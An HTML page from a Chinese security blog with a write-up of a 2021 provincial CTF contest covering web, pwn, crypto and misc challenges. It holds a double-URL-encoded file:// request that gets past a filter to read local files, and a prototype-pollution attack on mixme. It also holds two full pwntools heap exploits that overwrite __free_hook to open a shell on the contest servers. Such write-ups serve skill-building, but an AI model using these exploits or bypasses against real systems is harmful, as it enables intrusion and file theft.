@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.plasf.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="WEBoldF12看源码有个接口随便整点链接发现会将文件打包成PDF。想到了前年还是去年的blackhat的一个议题，利用HTML转PDF时候link内容会被打包进PDF来读取flag。不过试了一下读远程HTML好像不大行。  尝试读取/etc/passwd     尝试读取flag，发现被过滤。直接双url编码绕过读取，直接读到flag，应该非预期。 http://8.134.48.81:200">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="省赛WP">
+<meta property="og:url" content="https://www.plasf.cn/articles/gdss2021.html">
+<meta property="og:site_name" content="Xiao Leung&#39;s Blog">
+<meta property="og:description" content="WEBoldF12看源码有个接口随便整点链接发现会将文件打包成PDF。想到了前年还是去年的blackhat的一个议题，利用HTML转PDF时候link内容会被打包进PDF来读取flag。不过试了一下读远程HTML好像不大行。  尝试读取/etc/passwd     尝试读取flag，发现被过滤。直接双url编码绕过读取，直接读到flag，应该非预期。 http://8.134.48.81:200">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic//image-20210523154113171.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic//image-20210523154227719.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic//image-20210523154301354.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic//image-20210523154425481.png">
+<meta property="og:image" content="https://cdn.redmango.top/img/20210523154626.png">
+<meta property="og:image" content="https://cdn.redmango.top/img/20210523154808.png">
+<meta property="og:image" content="https://cdn.redmango.top/img/20210523155407.png">
+<meta property="og:image" content="https://cdn.redmango.top/img/20210523155430.png">
+<meta property="og:image" content="https://cdn.redmango.top/img/20210523155557.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic//image-20210523173441760.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic//rsa.png">
+<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210523160035744.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic//image-20210523193636029.png">
+<meta property="og:updated_time" content="2021-05-23T11:53:33.336Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="省赛WP">
+<meta name="twitter:description" content="WEBoldF12看源码有个接口随便整点链接发现会将文件打包成PDF。想到了前年还是去年的blackhat的一个议题，利用HTML转PDF时候link内容会被打包进PDF来读取flag。不过试了一下读远程HTML好像不大行。  尝试读取/etc/passwd     尝试读取flag，发现被过滤。直接双url编码绕过读取，直接读到flag，应该非预期。 http://8.134.48.81:200">
+<meta name="twitter:image" content="https://goodcheerleung.gitee.io/macpic//image-20210523154113171.png">
+
+<link rel="canonical" href="https://www.plasf.cn/articles/gdss2021.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>省赛WP | Xiao Leung's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?9905f6cfc84bbdd051e0d6a5e5f8714a";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Xiao Leung's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">专注网络安全研究</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/gdss2021.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          省赛WP
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-23 19:47:56 / 修改时间：19:53:33" itemprop="dateCreated datePublished" datetime="2021-05-23T19:47:56+08:00">2021-05-23</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>13k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>12 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="old"><a href="#old" class="headerlink" title="old"></a>old</h3><p>F12看源码有个接口随便整点链接发现会将文件打包成PDF。想到了前年还是去年的blackhat的一个议题，利用HTML转PDF时候link内容会被打包进PDF来读取flag。不过试了一下读远程HTML好像不大行。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic//image-20210523154113171.png" alt="image-20210523154113171"></p>
+<p>尝试读取/etc/passwd</p>
+<img src="https://goodcheerleung.gitee.io/macpic//image-20210523154227719.png" alt="image-20210523154227719" style="zoom:25%;">
+
+<img src="https://goodcheerleung.gitee.io/macpic//image-20210523154301354.png" alt="image-20210523154301354" style="zoom:50%;">
+
+<p>尝试读取flag，发现被过滤。直接双url编码绕过读取，直接读到flag，应该非预期。</p>
+<pre><code>http://8.134.48.81:20012/openStream?url=file:///%2566lag.txt</code></pre><img src="https://goodcheerleung.gitee.io/macpic//image-20210523154425481.png" alt="image-20210523154425481" style="zoom:50%;">
+
+<h3 id="try-js"><a href="#try-js" class="headerlink" title="try_js"></a>try_js</h3><p>附件给出源码：</p>
+<pre><code class="javascript">const http = require(&quot;http&quot;);
+const express = require(&quot;express&quot;);
+const bodyParser = require(&quot;body-parser&quot;);
+const mixme = require(&quot;mixme&quot;);
+const session = require(&quot;express-session&quot;);
+const randomize = require(&quot;randomatic&quot;);
+const morgan = require(&quot;morgan&quot;);
+
+const app = express();
+app.set(&quot;json escape&quot;, true);
+app.use(morgan(&quot;short&quot;));
+app.use(bodyParser.urlencoded({ extended: true })).use(bodyParser.json());
+// app.use(express.json());
+app.use(
+    session({
+        name: &quot;session&quot;,
+        secret: randomize(&quot;aA0&quot;, 16),
+        resave: false,
+        saveUninitialized: false,
+    })
+);
+
+const Super = {
+    passone: process.env.sperson,
+};
+
+function blacklist(url) {
+    var evilwords = [&quot;DirectoryIterator&quot;, &quot;FilesystemIterator&quot;, &quot;GlobIterator&quot;];
+    var arrayLen = evilwords.length;
+    for (var i = 0; i &lt; arrayLen; i++) {
+        const trigger = url.includes(evilwords[i]);
+        if (trigger === true) {
+            return true;
+        }
+    }
+}
+
+//TODO
+//get url content
+
+app.post(&quot;/getinfo&quot;, (req, res) =&gt; {
+    console.log(req.body);
+    if (req.body.userid === undefined || req.body.key === undefined) {
+        res.send(&quot;you want to post null?&quot;);
+    } else {
+        let userid = req.body.userid;
+        let key = req.body.key;
+        console.log(userid);
+        console.log(key);
+        if (Super[userid] === key) {
+            res.send(
+                &quot;admin!\nyou can goto ***** endpoint to hack!&quot;
+            );
+        } else {
+            res.send(&quot;You are not the Super, so I cannot give you the truth.&quot;);
+        }
+    }
+});
+
+app.all(&quot;/&quot;, (req, res) =&gt; {
+    let data = { userid: [], key: [] };
+    console.log(data);
+    console.log(req.body);
+    if (req.method == &quot;POST&quot; &amp;&amp; req.body) {
+        data = mixme.merge(data, req.body);
+        req.session.data = data;
+        // console.log(&quot;After MERGE: &quot; + Super[&quot;test&quot;]);
+    }
+    res.send(&quot;to be admin and you will find it!&quot;);
+});
+
+app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`));</code></pre>
+<p>其中:</p>
+<pre><code class="js">data = mixme.merge(data, req.body);</code></pre>
+<p>此处有个merge操作有个CVE（<a href="https://www.op-c.net/2021/05/05/prototype-pollution-high-vulnerability-in-mixme-npm-package/）找到项目，发现有个commit显示提交了一个修复：" target="_blank" rel="noopener">https://www.op-c.net/2021/05/05/prototype-pollution-high-vulnerability-in-mixme-npm-package/）找到项目，发现有个commit显示提交了一个修复：</a></p>
+<p><a href="https://github.com/adaltas/node-mixme/commit/cfd5fbfc32368bcf7e06d1c5985ea60e34cd4028" target="_blank" rel="noopener">https://github.com/adaltas/node-mixme/commit/cfd5fbfc32368bcf7e06d1c5985ea60e34cd4028</a></p>
+<p><img src="https://cdn.redmango.top/img/20210523154626.png" alt></p>
+<p>如果远程版本在提交之前，那么就可以原型链污染，本地启个环境:</p>
+<p><img src="https://cdn.redmango.top/img/20210523154808.png" alt></p>
+<p>远程打出接口：</p>
+<p><img src="https://cdn.redmango.top/img/20210523155407.png" alt></p>
+<p><img src="https://cdn.redmango.top/img/20210523155430.png" alt></p>
+<p>访问是一个请求内网80端口的接口，直接扫目录找到一个info.php还有一个z.php在z.php直接得到flag，不过看黑名单预期应该是原生类反序列化读文件，不过没找到能够利用的PHP文件，这个应该是非预期。<br><img src="https://cdn.redmango.top/img/20210523155557.png" alt></p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="PWN1（BabyNote）"><a href="#PWN1（BabyNote）" class="headerlink" title="PWN1（BabyNote）"></a>PWN1（BabyNote）</h3><pre><code class="python">from pwn import *
+# context.log_level = &#39;debug&#39;
+context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]
+
+
+
+def add(content):
+    p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,str(1))
+    p.sendafter(&quot;Input Content:\n&quot;,content)
+def gift():
+    p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,str(666))
+def delete(id):
+    p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,str(3))
+    p.sendlineafter(&quot;Input ID:\n&quot;,str(id))
+def edit(id,content):
+    p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,str(2))
+    p.sendlineafter(&quot;Input ID:\n&quot;,str(id))
+    p.sendafter(&quot;Input Content:\n&quot;,content)
+
+def exp():
+    add(&#39;a&#39;*58)#0
+    add(&#39;a&#39;*58)#1
+    add(&#39;a&#39;*58)#2
+    for _ in range(8):
+        delete(0)
+        edit(0,&#39;b&#39;*0x58)
+    edit(0,&#39;\x00&#39;*0x10)
+    p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,&#39;1&#39;*0x450)
+    edit(0,&#39;\xa0\x66&#39;)
+
+    stdout_offset = libc.symbols[&#39;_IO_2_1_stdout_&#39;]
+    log.info(&quot;stdout_offset:&quot;+hex(stdout_offset))
+
+    add(&#39;c&#39;*0x8)#3
+    # gdb.attach(p,&quot;b *$rebase(0x1392)&quot;)
+    # raw_input()
+    add(p64(0x0FBAD1887) +p64(0)*3 + p8(0x00))#4
+    libc_addr = u64(p.recvuntil(&#39;\x7f&#39;,timeout=1)[-6:].ljust(8,&#39;\x00&#39;))-(0x7fbe678e5980-0x7fbe676fa000)#- (0x7ffff7fac980-0x7ffff7dc1000)
+    log.info(&quot;libc_addr:&quot;+hex(libc_addr))
+
+    free_hook = libc_addr+libc.sym[&#39;__free_hook&#39;]
+    system_addr = libc_addr+libc.sym[&#39;system&#39;]
+    binsh_str = libc_addr+libc.search(&#39;/bin/sh&#39;).next()
+
+    delete(1)
+    edit(1,p64(free_hook)*2)
+    add(&#39;/bin/sh\x00&#39;)
+    add(p64(system_addr))
+    delete(1)
+
+    p.interactive()
+
+
+# p = process(&quot;./BabyNote&quot;,env={&#39;LD_PRELOAD&#39;:&#39;./libc-2.31.so&#39;})
+# libc = ELF(&quot;./libc-2.31.so&quot;)
+# exp()
+
+if __name__ == &#39;__main__&#39;:
+    # p = process(&quot;./BabyNote&quot;,env={&#39;LD_PRELOAD&#39;:&#39;./libc-2.31.so&#39;})
+    # libc = ELF(&quot;./libc-2.31.so&quot;)
+    # p = process(&quot;./BabyNote&quot;)
+    # libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+    p = remote(&quot;8.134.14.168&quot;, 10000)
+    libc = ELF(&quot;./libc-2.31.so&quot;)
+    while True:
+        try:
+            exp()
+            exit(0)
+        except:
+            p.close()
+            p = remote(&quot;8.134.14.168&quot;, 10000)
+            # p = process(&quot;./BabyNote&quot;,env={&#39;LD_PRELOAD&#39;:&#39;./libc-2.31.so&#39;})
+</code></pre>
+<h3 id="PWN2-BabyNote-revenge"><a href="#PWN2-BabyNote-revenge" class="headerlink" title="PWN2 BabyNote_revenge"></a>PWN2 BabyNote_revenge</h3><pre><code class="python">from pwn import *
+# context.log_level = &#39;debug&#39;
+context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]
+
+
+
+def add(content):
+    p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,str(1))
+    p.sendafter(&quot;Input Content:\n&quot;,content)
+def gift():
+    p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,str(666))
+def delete(id):
+    p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,str(3))
+    p.sendlineafter(&quot;Input ID:\n&quot;,str(id))
+def edit(id,content):
+    p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,str(2))
+    p.sendlineafter(&quot;Input ID:\n&quot;,str(id))
+    p.sendafter(&quot;Input Content:\n&quot;,content)
+
+def exp():
+    add(&#39;a&#39;*58)#0
+    add(&#39;a&#39;*58)#1
+    add(&#39;a&#39;*58)#2
+    for _ in range(8):
+        delete(0)
+        edit(0,&#39;b&#39;*0x58)
+    edit(0,&#39;\x00&#39;*0x10)
+    p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,&#39;1&#39;*0x450)
+    # edit(0,&#39;\xa0\xa6&#39;)
+    edit(0,&#39;\xa0\x66&#39;)
+
+
+    # stdout_offset = libc.symbols[&#39;_IO_2_1_stdout_&#39;]
+    # log.info(&quot;stdout_offset:&quot;+hex(stdout_offset))
+
+    add(&#39;c&#39;*0x8)#3
+    add(p64(0x0FBAD1887) +p64(0)*3 + p8(0x00))#4
+    libc_addr = u64(p.recvuntil(&#39;\x7f&#39;,timeout=1)[-6:].ljust(8,&#39;\x00&#39;))-(0x7f61c5525980-0x7f61c533a000)#(0x7ffff7f59980-0x7ffff7d6e000)
+    #libc_addr:0x7f1eb42b5980
+    log.info(&quot;libc_addr:&quot;+hex(libc_addr))
+    # gdb.attach(p,&quot;b *$rebase(0x13E2)&quot;)
+    # raw_input()
+    free_hook = libc_addr+libc.sym[&#39;__free_hook&#39;]
+    log.info(&quot;free_hook:&quot;+hex(free_hook))
+    system_addr = libc_addr+libc.sym[&#39;system&#39;]
+    binsh_str = libc_addr+libc.search(&#39;/bin/sh&#39;).next()
+
+    delete(1)
+    edit(1,p64(free_hook)*2)
+    add(&#39;/bin/sh\x00&#39;)
+    add(p64(system_addr))
+
+
+
+    delete(1)
+
+    p.interactive()
+
+
+# p = process(&quot;./BabyNote_revenge&quot;,env={&#39;LD_PRELOAD&#39;:&#39;./libc-2.31.so&#39;})
+# libc = ELF(&quot;./libc-2.31.so&quot;)
+# exp()
+
+if __name__ == &#39;__main__&#39;:
+    # p = process(&quot;./BabyNote_revenge&quot;,env={&#39;LD_PRELOAD&#39;:&#39;./libc-2.31.so&#39;})
+    # libc = ELF(&quot;./libc-2.31.so&quot;)
+    # p = process(&quot;./BabyNote_revenge&quot;)
+    # libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+    p = remote(&quot;8.134.14.168&quot;, 10001)
+    libc = ELF(&quot;./libc-2.31.so&quot;)
+    while True:
+        try:
+            exp()
+            exit(0)
+        except:
+            p.close()
+            p = remote(&quot;8.134.14.168&quot;, 10001)
+            # p = process(&quot;./BabyNote_revenge&quot;,env={&#39;LD_PRELOAD&#39;:&#39;./libc-2.31.so&#39;})
+            # p = process(&quot;./BabyNote_revenge&quot;)
+</code></pre>
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="这是道签到题"><a href="#这是道签到题" class="headerlink" title="这是道签到题"></a>这是道签到题</h3><p>010打开发现是一个压缩包直接改后缀，解压得到一张图片，扔010里面找到一个密文一个秘钥，解出来：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic//image-20210523173441760.png" alt="image-20210523173441760"></p>
+<h3 id="CRYPTOCRYPTO"><a href="#CRYPTOCRYPTO" class="headerlink" title="CRYPTOCRYPTO"></a>CRYPTOCRYPTO</h3><pre><code class="python">import random
+from Crypto.Cipher import AES
+from Crypto.Util.number import long_to_bytes
+
+# right shift inverse
+
+
+def inverse_right(res, shift, bits=32):
+    tmp = res
+    for i in range(bits // shift):
+        tmp = res ^ tmp &gt;&gt; shift
+    return tmp
+
+
+# right shift with mask inverse
+def inverse_right_mask(res, shift, mask, bits=32):
+    tmp = res
+    for i in range(bits // shift):
+        tmp = res ^ tmp &gt;&gt; shift &amp; mask
+    return tmp
+
+# left shift inverse
+
+
+def inverse_left(res, shift, bits=32):
+    tmp = res
+    for i in range(bits // shift):
+        tmp = res ^ tmp &lt;&lt; shift
+    return tmp
+
+
+# left shift with mask inverse
+def inverse_left_mask(res, shift, mask, bits=32):
+    tmp = res
+    for i in range(bits // shift):
+        tmp = res ^ tmp &lt;&lt; shift &amp; mask
+    return tmp
+
+
+def extract_number(y):
+    y = y ^ y &gt;&gt; 11
+    y = y ^ y &lt;&lt; 7 &amp; 2636928640
+    y = y ^ y &lt;&lt; 15 &amp; 4022730752
+    y = y ^ y &gt;&gt; 18
+    return y &amp; 0xffffffff
+
+
+def recover(y):
+    y = inverse_right(y, 18)
+    y = inverse_left_mask(y, 15, 4022730752)
+    y = inverse_left_mask(y, 7, 2636928640)
+    y = inverse_right(y, 11)
+    return y &amp; 0xffffffff
+
+
+f = open(&#39;output&#39;, &#39;r&#39;).read().strip().split(&#39;,&#39;)
+r = [int(i) for i in f[:-1]]
+c = long_to_bytes(int(f[-1], 16))
+state = []
+for _ in range(624):
+    state.append(recover(r[_]))
+for i in range(624):
+    for j in range(i+1):
+        state[j] ^= i % 256
+s = (3, tuple(state+[0]), None)
+print(len(s[1]))
+random.setstate(s)
+key = long_to_bytes(random.getrandbits(128))
+a = AES.new(key, AES.MODE_ECB)
+print(a.decrypt(c))
+#
+</code></pre>
+<h3 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h3><p>国赛rsa改编，得到text后md5加密即可拿到flag</p>
+<p>m1、m2、m3分别是维纳攻击、Hastad攻击、已知p高位攻击</p>
+<p>m1：</p>
+<pre><code class="python">import gmpy2
+import libnum
+import RSAwienerHacker
+
+c = 51084654001062999676284508744761337160593155669881973332922269056143420517629679695048487021241292007953887627491190341353167847566083172502480747704275374070492531393399916651443961186981687573379323436438906676133035045064486529453649419053918833072924346775468502743027859482041178726542991466613589539914
+e = 8336175595129952911533542789423826996569722546516271636161500363234194699197831564741315089461869306051343021000467004786843886241187253481694116720349730349091091395871354352082596957433423648367398183367388782648648524548000549086553610297047964333156830786192545363469852460230159194760278103213655609189
+n = 151092363916177851152025151918241584641682210212036254637668925062407387596818893923128056380386244596150134405578253100187360613990057596729265767426618262474915825169178445560157476701330766996735046666440633251722785157310664928275249725806466188778983132016426476941426227570021630850606892034122220619913
+
+d = RSAwienerHacker.hack_RSA(e, n)
+m = gmpy2.powmod(c, d, n)
+print(libnum.n2s(int(m)))</code></pre>
+<p>m2：</p>
+<pre><code class="python">import gmpy2
+import libnum
+
+c1 = 24168576475826731342981309869386844888048819155804916609868467364828794195081900378454942799582364951590154660883127133517306279315632213654294241046389472660162658285116025022019193389467425762033793233310853287285710051131156746537960416278314488047201950871542871471614834606092674080171837479678908485762
+c2 = 59042322068112449729750363498227925481549151238455994334741763136215058751527859574931116063334209500284095818008451340013716449554106507373112252757273078880364298445003064190906862585372984554264625861222115429779924444369582923270264732188891567089849725691839301479707767233813043465943547876632578498984
+c3 = 86124343357786577132154304914637897169467679024253471444678880447274558440276584635040507167438356800005540641456548793163113750596432451742228432593182300337042281015596655874375158300461112977200671847176880860698060672936210257455599090524023845268651175379694950602443080246153556268191330489901634436
+
+n1 = 0x57696c78e1d443a3c9211963c721c16e47068eb3b52dfb79ef55af340e7894c7e301a5f38734ddd10e67d0dd2f5759ae0443ca47719d82bfcccc9d26b05043b0b66b253219f266ea133fc613e23dbe14d5f731c5ad4158286a1139e2927b8a485df0e662d77277f61f4ff334a24b51959e399e5e778b6934897b6b9f4b315207
+n2 = 0xc7e5c4318b4376a93588ea853a70f5576aaa3a291acff806f87b00b01443edfd9298915343e8d219fc09ab464c02d12fa72abb0e70d40b12c63274bcf4a61ccb7c81d42fbb04f54e9ce972c3467c851932ecf8f0ada57f56ee91dad3837669fc501d69c68dce305d62cd1f09acff28874792ef343fca185bdc9d2432fd45d3d1
+n3 = 0x8d0899da21f7a50a5a869b0914fdfbc7d67aa85941021403889d24cb5b8029dd45a14e02f83dba7c21b3759fb152e045dcad6f11421e578a1b01d5e0b077810fc33e5f8d6d8e3623d278c908bbf7f4f7adb7224014e1f14272214e1a05cf4314dd950290fddbec9870be2c1d100bcdaf7056a1b909a400bb1f549efbede68bcf
+
+N = n1 * n2 * n3
+N1 = n2 * n3
+N2 = n1 * n3
+N3 = n1 * n2
+d1 = gmpy2.invert(N1, n1)
+d2 = gmpy2.invert(N2, n2)
+d3 = gmpy2.invert(N3, n3)
+
+tmp = (c1*d1*N1 + c2*d2*N2 + c3*d3*N3) % N
+m = gmpy2.iroot(tmp, 3)
+print(libnum.n2s(int(m[0])))</code></pre>
+<p>m3：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic//rsa.png" alt="rsa"></p>
+<pre><code class="python">import gmpy2
+import libnum
+
+p = 126596896828983947657897211653294325357694173315986362964483543178327683872006349352506228192861938882562062524573153829867465009733178457399135420215887364009777012624212242069216745138202953735034716032666189414323613790242613717531697843979604409625853777348356827810939640137432278820298916431800157020739
+n = 12382768780688845948585828171746451695620690637388724603203719934675129634162669400211587652801497553140445052212955447547285342951827548927777971592012005336108991182804517438932388430909818349339928033362693776498198280566445301283769762658236093273135470594245556180103947875110497679850836950853434075025187940546602828416710260312146348085635062790163306288554171471977697811571151068804586709977754482736587083043633360827556846476139372134496068081264161278183780518986923815627524813237434789592133132430580528353375704616450593022343415392743694469637309237497448893478902243349283615118435345397909237495251
+e = 65537
+c = 7479226689503128706443123521570581658668839203982072419275773066090139369387752424856982287500754805036668221578674582111373214400048065981143586768159093517856729586240876781314226713473457848588205839635234624256432258024026698381646902196832849461804350553542541128509121012667792037004716033974053614737451942287543723238730054875983726091182977666880984732837604625557483621161056089767140997756267432137190239967241490004246596723655769407636914860893150081043179313259622038983431488143887092338693868571374510729082940832360819295528352729394196810748661957966996263811903630229686768254608968394381708296458
+q = n//p
+phi = (p-1)*(q-1)
+d = gmpy2.invert(e, phi)
+m = pow(c, d, n)
+print(libnum.n2s(int(m)))</code></pre>
+<p>三段合并得到</p>
+<pre><code>So long as men can breathe or eyes can see, So long lives this and this gives life to thee.Chest has a bright ambition, no high can not be climbed.You never know how strong you really are until being strong is the only choice you have.</code></pre><p>md5加密后得到flag</p>
+<pre><code>flag{096d9ddd8c911b95d91fa7d6d7460c3c}</code></pre><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="你看看是什么"><a href="#你看看是什么" class="headerlink" title="你看看是什么"></a>你看看是什么</h3><p>把文件解压后的test.pacpng直接binwalk分离之后的rar文件里面有个flag.txt</p>
+<pre><code>MZWGCZ33MZUW4ZC7OJSWC3C7O5QXSX3UNBQW4X3ZN52V6Y3BNZPXO2LOPU======</code></pre><p>直接base32解得flag</p>
+<pre><code>flag{find_real_way_than_you_can_win}</code></pre><h3 id="小猪的家"><a href="#小猪的家" class="headerlink" title="小猪的家"></a>小猪的家</h3><p>用Stegsolve发现pig.png有25帧，并且每一帧都有一小部分二维码如下</p>
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210523160035744.png" alt="image-20210523160035744"></p>
+<p>把这些二维码拼接起来，扫码得到3faf86140，然后同样binwalk分离pig.png发现有个out/pigpen.png，用3faf86140为密码解压，里面是猪圈密码，用网上得密码表一个个对着写即可获取flag</p>
